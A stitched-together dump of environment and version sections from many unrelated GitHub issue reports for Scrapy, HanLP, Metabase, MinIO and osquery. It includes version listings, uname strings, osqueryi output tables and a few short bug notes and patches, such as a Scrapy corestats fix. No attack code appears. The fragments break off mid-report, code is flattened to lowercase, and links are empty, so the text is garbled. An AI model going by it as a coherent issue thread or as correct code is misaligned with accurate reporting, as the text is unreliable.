from scrapy.exporters import csvitemexporter class cricketcrawlerpipeline: def open_spider(self, spider): self.name_to_exporter = {} def close_spider(self, spider): for exporter in self.name_to_exporter.values(): exporter.finish_exporting() def process_item(self, item, spider): exporter = self._exporter_for_item(item) exporter.export_item(item) return item def _exporter_for_item(self, item): name = item['name'] if name not in self.name_to_exporter: f = open(f'{item.folder}/{name}.csv', 'wb') exporter = csvitemexporter(f) exporter.start_exporting() self.name_to_exporter[name] = exporter return self.name_to_exporter[name]
scrapy : 2.3.0
lxml : 4.5.2.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.5 | packaged by conda-forge | (default, sep 16 2020, 17:43:11) - [clang 10.0.1 ]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 3.1
platform : macos-10.14.6-x86_64-i386-64bit
scrapy : 2.3.0
lxml : 4.5.2.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.5 (default, jul 21 2020, 10:48:26) - [clang 11.0.3 (clang-1103.0.32.62)]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 3.0
platform : macos-10.15.6-x86_64-i386-64bit
scrapy : 2.1.0
lxml : 4.5.1.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.2 (v3.8.2:7b3ab5921f, feb 24 2020, 17:52:18) - [clang 6.0 (clang-600.0.57)]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 2.9.2
platform : macos-10.15.6-x86_64-i386-64bit
i can't get the version because it throw error
scrapy : 2.3.0
lxml : 4.5.2.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.2 (default, feb 26 2020, 14:58:38) - [gcc 8.3.0]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 3.0
platform : linux-4.19.76-linuxkit-x86_64-with-glibc2.2.5
scrapy : 2.2.0
lxml : 4.5.1.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.8.3 (default, jun 27 2020, 12:47:10) - [clang 11.0.0 (clang-1100.0.33.8)]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 2.9.2
platform : macos-10.15.5-x86_64-i386-64bit
scrapy 2.1.0 / master
scrapy : 2.1.0
lxml : 4.5.1.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.7.4 (default, sep 4 2019, 15:20:53) - [clang 10.0.0 (clang-1000.10.44.4)]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 2.9.2
platform : darwin-19.4.0-x86_64-i386-64bit
``` ### reason in `feedexporter.close_spider`, it **returns** a deferred from inside a loop instead of adding it to `deferred_list` ``` deferred_list = [] for slot in self.slots: if not slot.itemcount and not slot.store_empty: # we need to call slot.storage.store nonetheless to get the file # properly closed
return defer.maybedeferred(slot.storage.store, slot.file)
scrapy : 2.1.0
lxml : 4.5.1.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.6.0
w3lib : 1.22.0
twisted : 20.3.0
python : 3.7.4 (default, sep 4 2019, 15:20:53) - [clang 10.0.0 (clang-1000.10.44.4)]
pyopenssl : 19.1.0 (openssl 1.1.1g 21 apr 2020)
cryptography : 2.9.2
platform : darwin-19.4.0-x86_64-i386-64bit
scrapy : 2.0.1
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 20.3.0
python : 3.7.4 (v3.7.4:e09359112e, jul 8 2019, 14:54:52) - [clang 6.0 (clang-600.0.57)]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : darwin-18.7.0-x86_64-i386-64bit
scrapy : 2.0.1
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.6.9 (default, nov 7 2019, 10:44:02) - [gcc 8.3.0]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : linux-4.15.0-96-generic-x86_64-with-linuxmint-19.1-tessa
scrapy 2.0 ```
scrapy : 2.0.1
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.7.6 (default, jan 8 2020, 19:59:22) - [gcc 7.3.0]
pyopenssl : 19.1.0 (openssl 1.1.1e 17 mar 2020)
cryptography : 2.8
platform : linux-4.18.0-80.11.2.el8_0.x86_64-x86_64-with-centos-8.0.1905-core
scrapy : 2.0.1
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 20.3.0
python : 3.7.7 (default, mar 11 2020, 23:30:22) - [clang 10.0.0 (clang-1000.11.45.5)]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : darwin-17.7.0-x86_64-i386-64bit
> scrapy : 2.0.1
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 20.3.0
python : 3.7.5 (default, nov 20 2019, 09:21:52) - [gcc 9.2.1 20191008]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : linux-5.3.0-45-generic-x86_64-with-ubuntu-19.10-eoan
scrapy : 1.8.0
lxml : 4.4.1.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.7.4 (default, aug 9 2019, 18:22:51) [msc v.1915 32 bit (intel)]
pyopenssl : 19.0.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.7
platform : windows-10-10.0.18362-sp0
scrapy : 1.8.0
lxml : 4.5.0.0
libxml2 : 2.9.10
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.8.1 (default, jan 8 2020, 16:15:59) - [clang 4.0.1 (tags/release_401/final)]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : macos-10.15.3-x86_64-i386-64bit
`python -m scrapy version --verbose` yields.
scrapy : 1.8.0
lxml : 4.4.1.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.7.4 (default, aug 9 2019, 18:34:13) [msc v.1915 64 bit (amd64)]
pyopenssl : 19.0.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.7
platform : windows-10-10.0.18362-sp0
affected: all versions after pr #2082 when flags were added to `request`
(>1.4.0) ### response.follow() method not consistent with request.__init__()
missing `flags`
no sure how this got missed since pr #2082 was merged, but looking at the parameters for `request.__init__` and `response.follow` it appears `flags` wasn't added to `response.follow` to keep it in line with how creating new `request` instances works
i'm not sure if this was just overlooked or was intentional, when `flags` support was added to requests
it's also missing for the subclasses of `response` as well (`textresponse` will need updated, the rest currently use inheritance)
i was looking to be able to add custom `flags` to certain `response.follow()` calls but realized looking at the source they wouldn't be carried over to the new responses, but this can easily be worked around by manually added the flag after request creation
this seems like an easy fix to include in 1.8.1 or later but doesn\'t seem too high priority and i just thought you guys should know or that it should at least be noted somewhere on this repo since the [docs]( #scrapy.http.response.follow) still say, "it accepts the same arguments as `request.__init__` method...".
scrapy : 1.7.1
lxml : 4.2.5.0
libxml2 : 2.9.8
cssselect : 1.0.3
parsel : 1.5.1
w3lib : 1.19.0
twisted : 18.9.0
python : 3.6.8 (default, may 8 2019, 05:35:00) - [gcc 6.3.0 20170516]
pyopenssl : 18.0.0 (openssl 1.1.0j 20 nov 2018)
cryptography : 2.4.2
platform : linux-4.9.184-linuxkit-x86_64-with-debian-9.9
scrapy : 1.7.3
lxml : 4.4.2.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.6.8 (default, jan 14 2019, 11:02:34) - [gcc 8.0.1 20180414 (experimental) [trunk revision 259383]]
pyopenssl : 19.1.0 (openssl 1.1.1d 10 sep 2019)
cryptography : 2.8
platform : linux-4.15.0-72-generic-x86_64-with-ubuntu-18.04-bionic
``` ### extra info probably we should handle known binary types in `content-type` here
at least, `application/pdf` should be in the list.
it would be nice to add some mechanism to allow developers to extend the mapping on the fly, as we can get new types in a project basis and it would be easier update the desired behavior.
scrapy : 1.8.0
lxml : 4.3.3.0
libxml2 : 2.9.9
cssselect : 1.0.3
parsel : 1.5.1
w3lib : 1.20.0
twisted : 19.2.0
python : 3.7.3 (default, mar 27 2019, 09:23:39) - [clang 10.0.0 (clang-1000.11.45.5)]
pyopenssl : 19.0.0 (openssl 1.1.1b 26 feb 2019)
cryptography : 2.6.1
platform : darwin-18.5.0-x86_64-i386-64bit
scrapy : 1.8.0
lxml : 4.4.1.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.10.0
python : 3.6.8 (default, oct 7 2019, 12:59:55) - [gcc 8.3.0]
pyopenssl : 19.0.0 (openssl 1.1.1 11 sep 2018)
cryptography : 2.1.4
platform : linux-3.10.0-1062.4.1.el7.x86_64-x86_64-with-ubuntu-18.04-bionic
scrapy : 1.7.3
lxml : 4.4.1.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.7.0
python : 3.7.3 | packaged by conda-forge | (default, jul 1 2019, 21:52:21) - [gcc 7.3.0]
pyopenssl : 19.0.0 (openssl 1.1.1c 28 may 2019)
cryptography : 2.7
platform : linux-4.15.0-65-generic-x86_64-with-debian-buster-sid
scrapy : 1.7.3
lxml : 4.3.2.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.20.0
twisted : 19.7.0
python : 3.7.3 (default, mar 27 2019, 17:13:21) [msc v.1915 64 bit (amd64)]
pyopenssl : 19.0.0 (openssl 1.1.1c 28 may 2019)
cryptography : 2.6.1
platform : windows-10-10.0.17134-sp0
at least master as of 534de7395da3a53b5a2c89960db9ec5d8fdab60c ### fix a possible fix is to use the elapsed time as a default argument so that `get_value()` does not return none
i can prepare a pr if needed
--- a/scrapy/extensions/corestats.py
+++ b/scrapy/extensions/corestats.py
@@ -25,7 +25,7 @@ class corestats(object): def spider_closed(self, spider, reason): finish_time = datetime.datetime.utcnow()
- elapsed_time = finish_time - self.stats.get_value('start_time')
+ elapsed_time = finish_time - self.stats.get_value('start_time', finish_time) elapsed_time_seconds = elapsed_time.total_seconds() self.stats.set_value('elapsed_time_seconds', elapsed_time_seconds, spider=spider) self.stats.set_value('finish_time', finish_time, spider=spider)
scrapy 1.7.3
scrapy : 1.7.3
lxml : 4.4.1.0
libxml2 : 2.9.9
cssselect : 1.1.0
parsel : 1.5.2
w3lib : 1.21.0
twisted : 19.7.0
python : 3.6.5 (default, may 3 2018, 10:08:28) - [gcc 5.4.0 20160609]
pyopenssl : 19.0.0 (openssl 1.1.1c 28 may 2019)
cryptography : 2.7
platform : linux-4.4.0-127-generic-x86_64-with-linuxmint-18.1-serena
- os platform and distribution (e.g., linux ubuntu 16.04): ubuntu 20.04
- python version: 3.8.3
- hanlp version: '2.0.0-alpha.61'
- os platform and distribution (e.g., linux ubuntu 16.04):
- python version:python3.7
- hanlp version:hanlp 2.0
- os platform and distribution (e.g., linux ubuntu 16.04):
- python version:
- hanlp version:
- os platform and distribution :centos 7
- python version: 3.7.6
- hanlp version: hanlp-2.0.0a44
- os platform and distribution (e.g., linux ubuntu 16.04): windows 10
- python version: 3.7
- hanlp version: 2.0.0-alpha.43
- os platform and distribution (e.g., linux ubuntu 16.04):
- python version: 3.6.8
- hanlp version: hanlp-2.0.0a39
- os platform and distribution (e.g., linux ubuntu 16.04):
- python version: linux xxx 4.15.0-72-generic #81-ubuntu smp tue nov 26 12:20:02 utc 2019 x86_64 x86_64 x86_64 gnu/linux
- hanlp version: 2.0.0a39
- os platform and distribution (e.g., linux ubuntu 16.04): windows 10
- python version: 3.7
- hanlp version: 2.0.0-alpha.39
- os platform and distribution (e.g., linux ubuntu 16.04): win10
- python version: java
- hanlp version: 1.7.6
- windows 0
- hanlp 1.7.5
- os platform and distribution:18.04
- python version:3.6
- hanlp version:hanlp 2.0.0a33
- os platform and distribution: ubuntu 18.04
- python version: 3.6
- hanlp version: hanlp 2.0.0a31
- os platform and distribution: ubuntu 18.04
- python version: 3.6
- hanlp version: hanlp 2.0.0a30
- ubuntu 18.04
- python version: 3.6
- hanlp version: 2.0.0-alpha.25
- os platform and distribution (e.g., linux ubuntu 16.04): google colab with gpu
- python version: 3.6
- hanlp version: 2.0.0
- os platform and distribution (e.g., linux ubuntu 16.04): mac os
- python version:
- hanlp version: 1.7.6
- os platform and distribution (e.g., linux ubuntu 16.04): darwin macbook 19.2.0
- python version: 3.7.5
- hanlp version: 2.0.0a10
- python 3.6.9
- hanlp version: 2.0.0-alpha.12 * [x] i've completed this form and searched the web for solutions.
{ "browser-info": { "language": "en-us", "platform": "macintel", "useragent": "mozilla/5.0 (macintosh; intel mac os x 10_15_1) applewebkit/537.36 (khtml, like gecko) chrome/79.0.3945.88 safari/537.36", "vendor": "google inc." }, "system-info": { "java.runtime.name": "openjdk runtime environment", "java.runtime.version": "1.8.0_111-internal-alpine-r0-b14", "java.vendor": "oracle corporation", "java.vendor.url": " ", "java.version": "1.8.0_111-internal", "java.vm.name": "openjdk 64-bit server vm", "java.vm.version": "25.111-b14", "os.name": "linux", "os.version": "4.9.0-7-amd64", "user.language": "en", "user.timezone": "gmt" }, "metabase-info": { "databases": [ "athena" ], "hosting-env": "unknown", "application-database": "mysql", "run-mode": "prod", "version": { "tag": "v0.34.0", "date": "2019-12-19", "branch": "release-0.34.x",
minio minio:release.2020-10-12t21-53-21z
running in ubuntu 20.04 under windows wsl2 using docker-compose
linux 8355ac78dd93 4.19.128-microsoft-standard #1 smp tue jun 23 12:58:10 utc 2020 x86_64 linux
* version used (`minio --version`): release.2020-10-03t02-19-42z
* server setup and configuration: vmware machine * operating system and version (`uname -a`): ubuntu 20.04.01 lts
* version used (`minio --version`):
![image]( * server setup and configuration:
* operating system and version (`uname -a`):
![image](
* version used (`minio --version`): release.2020-09-05t07-14-49z
* server setup and configuration: ./minio server /root/minio/data1 /root/minio/data2 /root/minio/data3 /root/minio/data4
* operating system and version (`uname -a`): linux server 4.18.0-80.11.2.el8_0.x86_64
* version used (`minio --version`): 2020-08-27t05:16:20z
* server setup and configuration: docker on mac
* operating system and version (`uname -a`): darwin xxx 17.7.0 darwin kernel version 17.7.0: fri jul 6 19:54:51 pdt 2018; root:xnu-4570.71.3~2/release_x86_64 x86_64
minio:release.2020-08-27t05-16-20z, default configuration
cluster and single-node
native and docker based
ubuntu 20.04
with kernel:
linux minio1 5.4.0-45-generic #49-ubuntu smp wed aug 26 13:38:52 utc 2020 x86_64 x86_64 x86_64 gnu/linux
synology nas running docker and minio version 2020-08-13t02:39:50z.
host: minio | os: linux | arch: amd64
runtime: version: go1.14.7 | cpus: 2
i am using ios device
* version used (`minio --version`): * server side: `minio version release.2020-06-14t18-32-17z` * client side `mc version release.2019-07-03t18-14-53z`
* server setup and configuration:
underlying filesystem is zfs mounted with noatime `zpool1/data/archive on /data/archive type zfs (rw,noatime)` * operating system and version (`uname -a`): * server side: `linux lddata-blue-stormd01 4.4.143-100.el6.x86_64 #1 smp wed jul 25 12:16:04 utc 2018 x86_64 x86_64 x86_64 gnu/linux` * client side `linux lddata-live-jupyter01 3.10.0-957.5.1.el7.x86_64 #1 smp fri feb 1 14:54:57 utc 2019 x86_64 x86_64 x86_64 gnu/linux`
kubernetes 1.18
minio version release.2020-07-14t19-14-30z
nfs backend: netapp
* version used (`minio --version`):
* server setup and configuration:
* operating system and version (`uname -a`):
* operating system and version (`uname -a`): `darwin 19.6.0 darwin kernel version 19.6.0: sun jul 5 00:43:10 pdt 2020; root:xnu-6153.141.1~9/release_x86_64 x86_64 i386 macbookpro15,1 darwin`
* version used (`minio --version`):
* server setup and configuration:
* operating system and version (`uname -a`):
minio version release.2020-07-18t18-48-16z
minio server /usr/local/data
mc config host add minio --api s3v4
darwin kernel version 19.5.0: tue may 26 20:41:44 pdt 2020; root:xnu-6153.121.2~2/release_x86_64 x86_64
[minio-obd_20200720211224.json.gz](
minio version: release.2020-04-02t21-34-49z
k8s version: 1.14.0
os version: 3.10.0-693.el7.x86_64 #1 smp tue aug 22 21:09:27 utc 2017 x86_64 x86_64 x86_64 gnu/linux
* version used (`minio --version`):
* server setup and configuration:
* operating system and version (`uname -a`):
minio version release.2020-07-13t18-09-56z
linux 3.10.0-957.el7.x86_64 gnu/linux
* version used (`minio version`):2020-07-02t00:15:09z
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):windows 10 enterprise/linux
* link to your project:
* version used (`minio version`): release.2020-07-02t00-15-09z * environment name and version (e.g
nginx 1.9.1): - eks 1.6
* server type and version: - kubernetes
* operating system and version (`uname -a`): amazon linux
* link to your project:
* version used (`minio version`):minio.release.2020-05-08t02-40-49z
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):windows 10
* link to your project:
* version used (`minio version`): release.2020-04-10t03-34-42z
* environment name and version (e.g
nginx 1.9.1): 1.10.3
* server type and version: ubuntu server 16.04
* operating system and version (`uname -a`):
* link to your project:
* operating system and version (`uname -a`): linux alarm 5.7.1-1-arch #1 smp tue jun 9 01:23:20 utc 2020 aarch64 gnu/linux
* link to your project: ### edit:
same problems are occurring with other people as well, so the arm isn't the issue here.
1:
2:
fresh installation of ubuntu 20.04 on both machines, firewall off
port forwarded
i can nmap the ip/port of the failing machine while its erroring and the port shows open
trying to connect appears to work but it causes both machines to then constantly throw errors
* version used (`minio version`): latest
* environment name and version (e.g
nginx 1.9.1):
* server type and version: ubuntu 20.04
* operating system and version (`uname -a`): linux jankynode1 5.4.0-37-generic #41-ubuntu smp wed jun 3 18:57:02 utc 2020 x86_64 x86_64 x86_64 gnu/linux
* link to your project:
* version used (`minio version`):release.2019-10-12t01-39-57z
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
* version used (`minio docker img`): 5f9dddcc548c * environment name and version (e.g
nginx 1.9.1): using ubuntu 20:04 as client and freenas 11.2 as nfs mount host
* server type and version:
* operating system and version (`uname -a`): ubuntu 18:04 as an alternative server that i already tested
* link to your project:
2017-08-05t00:00:53z
used: 3.1 mb | allocated: 4.8 mb | used-heap: 3.1 mb | allocated-heap: 6.8 mb
host: 90ae92e66137 | os: linux | arch: arm
version: go1.7.5 | cpus: 4
* server type and version: raspberry pi 3 running ubuntu 20.04 lts
* operating system and version (`uname -a`): linux ubuntu 5.4.0-1011-raspi #11-ubuntu smp fri may 8 07:43:33 utc 2020 aarch64 aarch64 aarch64 gnu/linux
* link to your project:
hdp 3.1.14-315 (hadoop 3.1.1 ,spark2.3.2)
minio : 2020-04-15t19:42:18z
os : ubuntu 18.04 x64 hadoop fs -copyfromlocal /etc/hadoop/conf/log4j.properties s3a://testbucket/testdata
i know dependencies issue.
do i need those *.jar and where do i copy them ?
* version used (`minio version`):
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
using docker image `minio/minio:release.2020-03-05t01-04-19z`, but this behaviour is present in earlier ones.
* version used (`minio version`): release.2020-01-03t19-12-21z
* environment name and version (e.g
nginx 1.9.1): nginx/1.14.0
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
*aws sdk 2.11.12
*minio release.2020-04-10t03-34-42z
*scala 2.12
*openjdk 8u241
* version used (`minio version`): 2020-04-22t00:11:12z
* server type and version: ubuntu 18.04.4 lts
* operating system and version (`uname -a`):linux 4.15.0-96-generic #97-ubuntu smp wed apr 1 03:25:46 utc 2020 x86_64 x86_64 x86_64 gnu/linux
* version used (`minio version`):
mc version release.2020-02-25t18-10-03z
minio version release.2020-03-09t18-26-53z * environment name and version (e.g
nginx 1.9.1): * server type and version: huawei 5288 v5 ;cpu intel(r) xeon(r) silver 4114 cpu @ 2.20ghz ;mem:196gb * operating system and version (`uname -a`):
linux 3.10.0-514.el7.x86_64 #1 smp tue nov 22 16:42:41 utc 2016 x86_64 x86_64 x86_64 gnu/linux
* link to your project:
[insufficientdisk.log](
[mc-trace.log](
* version used (`minio version`):release.2020-02-27t00-23-05z, release.2020-04-10t03-34-42z
* environment name and version (e.g
nginx 1.9.1):
* server type and version: minio
* operating system and version (`uname -a`):
* link to your project:
* version used (`minio version`): minio/minio:edge also tryed minio/minio
* os: centos 7
* ansible: 2.9.6
* docker: 19.03.8
* version used (`minio version`): mc version release.2020-04-04t05-28-55z
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`): windows 7
* link to your project:
* version used (`minio version`):# minio version
version: 2019-01-23t23:18:58z
release-tag: release.2019-01-23t23-18-58z
commit-id: bd25f31100f44646cffae99dfec23179366593e2
* environment name and version (e.g
nginx 1.9.1):
* server type and version: vm (vmware)
* operating system and version (`uname -a`): rhel 7.7
* version used (`minio version`): release.2020-03-14t02-21-58z
* operating system and version (`uname -a`): ubuntu 18.04.1
* link to your project:
* version used (`minio version`):
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
* version used (`minio version`):
2020-02-07t23:28:16z * operating system and version (`uname -a`):
host: es-17-13 | os: linux | arch: amd64
version: go1.13.7 | cpus: 4
* version used (`minio version`):
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
* version used (`minio version`): `2019-12-17t23:16:33z`
* environment name and version (e.g
nginx 1.9.1): `dokku 0.19.13`
* server type and version: `ubuntu server`
* operating system and version (`uname -a`): `linux apps 4.15.0-74-generic #84-ubuntu smp thu dec 19 08:06:28 utc 2019 x86_64 x86_64 x86_64 gnu/linux`
* version used (`minio version`):2019-10-12t01-39-57z
* environment name and version (e.g
nginx 1.9.1):
* server type and version:
* operating system and version (`uname -a`):
* link to your project:
* created my own minio dockerimage, based on rhel:7
ubuntu 18.04
ps c:\\users\ icholas> osqueryi --line "select version, build, platform from os_version;" version = 10.0.19041 build = 19041
platform = windows
+------------+-------+----------+
| version | build | platform |
+------------+-------+----------+
| 10.0.19041 | 19041 | windows |
+------------+-------+----------+
windows 10 and server 2016
version = 18.04.5 lts (bionic beaver) build =
platform = ubuntu
+------------+-------+----------+
| version | build | platform |
+------------+-------+----------+
| 10.0.18363 | 18363 | windows |
+------------+-------+----------+
+------------+-------+----------+
| version | build | platform |
+------------+-------+----------+
| 10.0.17763 | 17763 | windows |
+------------+-------+----------+
$ cat /etc/os-release name="ubuntu" version="20.04 lts (focal fossa)" id=ubuntu id_like=debian pretty_name="ubuntu 20.04 lts" version_id="20.04" version_codename=focal $ uname -r 5.4.0-40-generic i now notice [the build instructions]( mention **ubuntu 18.04/18.10** and not 20
but i was using kubuntu 18.10 at first when trying to build osquery...but the cmake was too old, and 18.10 [just hit end of life]( #:~:text=current%20releases%20%20%20%20release%20%20,%20april%2c%202024%20%204%20more%20rows%20) (july 2019)
so i upgraded.
+------------+-------+----------+
| version | build | platform |
+------------+-------+----------+
| 10.0.17763 | 17763 | windows |
+------------+-------+----------+ ```
<!-- osqueryi --line "select version, build, platform from os_version;"
windows server 2012 r2 standard
seen on different platforms
``` version = 10.15.4 build = 19e2265
platform = darwin
fedora release 32 (thirty two)
name=fedora
version="32 (workstation edition)"
version_id=32
version_codename=""
platform_id="platform:f32"
pretty_name="fedora 32 (workstation edition)"
ansi_color="0;34"
logo=fedora-logo-icon
cpe_name="cpe:/o:fedoraproject:fedora:32"
home_url=" "
documentation_url=" "
support_url=" "
bug_report_url=" "
redhat_bugzilla_product="fedora"
redhat_bugzilla_product_version=32
redhat_support_product="fedora"
redhat_support_product_version=32
privacy_policy_url=" "
variant="workstation edition"
variant_id=workstation
fedora release 32 (thirty two)
fedora release 32 (thirty two)
cpe:/o:fedoraproject:fedora:32
``` text```
osqueryi --line "select version, build, platform from os_version;"
e0524 11:35:36.653343 43087 init.cpp:627] [ref #1629] osqueryi initialize failed: could not initialize database
macos 10.15.4 19e287
<!-- osqueryi --line "select version, build, platform from os_version;"
--> version = 10.0.17763 build = 17763
platform = windows
ubuntu 18.04
macos 10.14.6
azure pipelines windows server 2016
ubuntu 18.04, fully patched.
<!-- osqueryi --line "select version, build, platform from os_version;"
$ osqueryi --line "select version, build, platform from os_version;" version = 10.14.6 build = 18g3020
platform = darwin
$ osqueryi --line "select version, build, platform from os_version;" version = 16.04.3 lts (xenial xerus) build =
platform = ubuntu
<!-- osqueryi --line "select version, build, platform from os_version;"
``` version = 10.0.18362 build = 18362
platform = windows
``` version = 10.14.6 build = 18g3020
platform = darwin
reproduced using mac and linux, and
# osqueryi --line "select version, build, platform from os_version;"
w0308 13:35:50.477732 61709 options.cpp:91] cannot set unknown or invalid flag: enable_monitor version = 18.04.4 lts (bionic beaver) build = platform = ubuntu
windows 10 version 10.0.18363
<!-- osqueryi --line "select version, build, platform from os_version;"
[tferguson-lt] c:\\users\\tferguson\\desktop>osqueryi420.exe "select version, build, platform from os_version;"
+------------+-------+----------+
| version | build | platform |
+------------+-------+----------+
| 10.0.16299 | 16299 | windows |
+------------+-------+----------+
osx 10.14 (mojave), but also seen with ubuntu 18.04, windows 10, etc
<!-- osqueryi --line "select version, build, platform from os_version;"
osquery> select version, build, platform from os_version;
+---------+-------+----------+
| version | build | platform |
+---------+-------+----------+
| 10.15.2 | 19c57 | darwin |
+---------+-------+----------+
the bug occurred in the following operating systems and possibly affect all linux distributions:
+----------+--------------------------------------+
| platform | version |
+----------+--------------------------------------+
| rhel | centos linux release 7.7.1908 (core) |
+----------+--------------------------------------+
| rhel | centos linux release 8.0.1905 (core) |
+----------+--------------------------------------+
| debian | 8 (jessie) |
+----------+--------------------------------------+
| debian | 9 (stretch) |
+----------+--------------------------------------+
| debian | 10 (buster) |
+----------+--------------------------------------+
| ubuntu | 14.04.5 lts, trusty tahr |
+----------+--------------------------------------+
| ubuntu | 16.04.6 lts (xenial xerus) |
+----------+--------------------------------------+
| ubuntu | 18.04.3 lts (bionic beaver) |
+----------+--------------------------------------+
<!-- osqueryi --line "select version, build, platform from os_version;"
this bug impacts all operating systems leveraging the tls plugin
os - windows 10.0.18363
<!-- osqueryi --line "select version, build, platform from os_version;"
windows (any)
macos 10.15.1 (catalina)
macos 10.14.6 (mojave)
<!-- osqueryi --line "select version, build, platform from os_version;"
macos 10.15.1 catalina
<!-- osqueryi --line "select version, build, platform from os_version;"
osquery> select version, build, platform from os_version; version = 10.0.17763 build = 17763 platform = windows ```
``` version = 10.0.18362 build = 18362
platform = windows
runtime environment: os name: windows os version: 10.0.17134 os platform: windows rid: win10-x64
windows 10 enterprise
``` version = 10.14.6 build = 18g1012
platform = darwin
macos, but all should be effected.
windows 7 build 7601
windows 10 build 17763
macos <!-- osqueryi --line "select version, build, platform from os_version;"
version = 10.15 build = 19a602
platform = darwin
linux 4.x version(s)
<!-- osqueryi --line "select version, build, platform from os_version;"
osquery> select version, build, platform from os_version; version = 10.13.6 build = 17g8037
platform = darwin
``` this is seen on 10.13, 10.14 and 10.15
windows 10 x64 rs3 (build 1703, 16299.1392)
version = 1903
build = 18362.356
platform = windows <!-- osqueryi --line "select version, build, platform from os_version;"
``` version = 10.0.17763 build = 17763
platform = windows
ubuntu 18.04
<!-- osqueryi --line "select version, build, platform from os_version;"
os: windows 10 enterprise rs3 x64 (10.0.16299) <!-- osqueryi --line "select version, build, platform from os_version;"
os: windows 10 enterprise rs3 x64 (10.0.16299) <!-- osqueryi --line "select version, build, platform from os_version;"
windows server 2016
``` version = 10.14.5 build = 18f132
platform = darwin
windows 10 enterprise <!-- osqueryi --line "select * from chrome_extensions;"
``` version = 10.14.3 build = 18d109
platform = darwin
version = 16.04.6 lts (xenial xerus) build = platform = ubuntu
``` version = centos linux release 7.6.1810 (core) build =
platform = rhel
``` version = centos linux release 7.6.1810 (core) build =
platform = rhel
10.0.17134 windows 10 pro (vm)
macos 10.13.6 (17g4015)
version = 10.0.17134
build = 17134
platform = windows
version = 10.0.15063 build = 15063
platform = windows this behavior is also seen on windows 7 and windows server 2012 r2
<!-- osqueryi --line "select version, build, platform from os_version;"
# osqueryi --line "select version, build, platform from os_version;" version = 16.04.5 lts (xenial xerus) build =
platform = ubuntu
c:\\programdata\\osquery\\osqueryd>osqueryi --line "select version, build, platform from os_version;" version = 10.0.14393 build = 14393
platform = windows
# osqueryi --line "select version, build, platform from os_version;" version = centos linux release 7.4.1708 (core) build = platform = rhel
ubuntu 18.04.1 lts
macos mojave 10.14.1 <!-- osqueryi --line "select version, build, platform from os_version;"
> osqueryi --line "select version, build, platform from os_version;" version = centos linux release 7.3.1611 (core) build =
platform = rhel
version = centos linux release 7.5.1804 (core) build = platform = rhel
macos high sierra 10.13.6 <!-- osqueryi --line "select version, build, platform from os_version;"
``` version = 9 (stretch) build = platform = debian
notice: inside docker container
the bug is cross platform
i'm on macos x 10.13.6
c:\\programdata\\osquery\\osqueryi.exe --line "select version, build, platform from os_version;"
